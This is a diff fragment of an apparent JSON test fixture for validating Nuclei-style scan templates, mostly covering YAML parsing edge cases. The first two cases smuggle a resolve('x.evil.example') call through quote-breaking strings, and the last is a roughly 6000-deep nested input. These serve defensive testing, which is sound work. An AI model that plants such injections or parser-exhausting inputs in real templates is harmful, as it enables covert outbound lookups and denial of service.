+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nvariables:\n  v: \"{{concat('a\\\"+resolve(\\\"x.evil.example\\\",\\\"a\\\")+\\\"','')}}\"\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}/x\"]\n    matchers:\n      - type: word\n        words: [\"x\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "q_dq_with_sq_inside",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}/x\"]\n    matchers:\n      - type: dsl\n        dsl:\n          - \"contains(body, \\\"a'+resolve('x.evil.example','a')+'\\\")\"\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "raw_get_blank_line_then_header_like_body",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - raw:\n      - |\n        GET /x HTTP/1.1\n        Host: {{Hostname}}\n\n        a: b\n    matchers:\n      - type: word\n        words: [\"x\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "trailing_newline_in_header_name",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}/x\"]\n    headers:\n      \"X-A\\n\": v\n    matchers:\n      - type: word\n        words: [\"x\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "trailing_newline_in_template_id",
+      "template": "id: \"c\\n\"\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}/x\"]\n    matchers:\n      - type: word\n        words: [\"x\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "section_sign_by_escape_in_value",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}/x\"]\n    headers:\n      X-A: \"a\\u00a7b\"\n    matchers:\n      - type: word\n        words: [\"x\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "control_character_by_escape_in_value",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}/x\"]\n    headers:\n      X-A: \"a\\x0bb\"\n    matchers:\n      - type: word\n        words: [\"x\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "plain_float_cvss_score",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\n  classification:\n    cvss-score: 9.8\n    cve-id: CVE-2024-0001\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}/x\"]\n    matchers:\n      - type: word\n        words: [\"x\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": true
+    },
+    {
+      "name": "crlf_line_endings",
+      "template": "id: c\r\ninfo:\r\n  name: c\r\n  severity: info\r\nhttp:\r\n  - method: GET\r\n    path: [\"{{BaseURL}}/x\"]\r\n    matchers:\r\n      - type: word\r\n        words: [\"x\"]\r\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": true
+    },
+    {
+      "name": "upper_case_metadata_key",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\n  metadata:\n    Verified: true\n    shodan-Query: x\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}/x\"]\n    matchers:\n      - type: word\n        words: [\"x\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": true
+    },
+    {
+      "name": "list_of_authors",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\n  author: [alice, bob]\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}/x\"]\n    matchers:\n      - type: word\n        words: [\"x\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": true
+    },
+    {
+      "name": "lone_carriage_return",
+      "template": "id: c\rinfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}/x\"]\n    matchers:\n      - type: word\n        words: [\"x\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "float_with_exponent",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\n  classification:\n    cvss-score: 9.8e0\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}/x\"]\n    matchers:\n      - type: word\n        words: [\"x\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "float_with_underscore",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\n  classification:\n    cvss-score: 9_8.5\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}/x\"]\n    matchers:\n      - type: word\n        words: [\"x\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "float_sexagesimal",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\n  classification:\n    cvss-score: 1:30.5\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}/x\"]\n    matchers:\n      - type: word\n        words: [\"x\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "metadata_key_yes_word",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\n  metadata:\n    Yes: x\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}/x\"]\n    matchers:\n      - type: word\n        words: [\"x\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "type_is_a_list",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: GET\n    path: [\"{{BaseURL}}/x\"]\n    matchers:\n      - type: [word]\n        words: [\"x\"]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "ssl_version_is_a_list",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nssl:\n  - address: \"{{Host}}:{{Port}}\"\n    min_version: [tls12]\n",
+      "read_only": true,
+      "own_target": true,
+      "sentinel": false
+    },
+    {
+      "name": "method_is_a_list",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp:\n  - method: [GET]\n    path: [\"{{BaseURL}}/x\"]\n    matchers:\n      - type: word\n        words: [\"x\"]\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    },
+    {
+      "name": "nested_6000_deep",
+      "template": "id: c\ninfo:\n  name: c\n  severity: info\nhttp: [[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]